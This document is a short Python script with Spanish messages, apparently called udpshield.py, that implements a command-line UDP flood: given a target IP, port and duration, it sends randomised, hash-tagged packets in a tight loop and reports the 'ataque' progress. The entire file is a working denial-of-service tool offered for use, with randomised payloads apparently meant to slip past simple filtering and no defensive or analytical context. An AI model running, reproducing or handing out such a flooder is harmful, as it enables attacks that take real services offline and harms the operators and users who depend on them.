import socket
import time
import os
import random
import string
import sys
import hashlib

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[91m")
    print("██    ██ ██████  ██████  ███████     ████████ ██   ██ ██ ███████ ██      ██████  ███████ ██████  ")
    print("██    ██ ██   ██ ██   ██ ██             ██    ██   ██ ██ ██      ██      ██   ██ ██      ██   ██ ")
    print("██    ██ ██████  ██   ██ ███████        ██    ███████ ██ █████   ██      ██████  █████   ██   ██ ")
    print("██    ██ ██      ██   ██      ██        ██    ██   ██ ██ ██      ██      ██   ██ ██      ██   ██ ")
    print(" ██████  ██      ██████  ███████        ██    ██   ██ ██ ███████ ███████ ██   ██ ███████ ██████  ")
    print("\033[0m")

def generate_unique_payload():
    # Datos aleatorios
    rand_text = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(100, 300)))
    timestamp = str(time.time()).encode()
    hash_part = hashlib.sha256(rand_text.encode() + timestamp).hexdigest()

    # Incluir patrón especial + aleatoriedad + hash
    payload = f"[UDPSHIELD]|{rand_text}|{hash_part}".encode()
    return payload

def udp_flood(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0

    try:
        while time.time() < timeout:
            payload = generate_unique_payload()
            sock.sendto(payload, (ip, port))
            sent += 1
            if sent % 500 == 0:
                print(f"\033[92m[+] Enviados {sent} paquetes únicos a {ip}:{port}\033[0m", end='\r')
    except KeyboardInterrupt:
        print("\n\033[93m[!] Ataque detenido por el usuario.\033[0m")
    finally:
        print(f"\n\033[92m[✓] Ataque finalizado. Total de paquetes enviados: {sent}\033[0m")

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("\033[91m[!] Uso correcto: python3 udpshield.py [ip] [port] [time]\033[0m")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])

    banner()
    print(f"\033[94m[*] Enviando ataque con paquetes únicos a {ip}:{port} durante {duration} segundos...\033[0m")
    udp_flood(ip, port, duration)

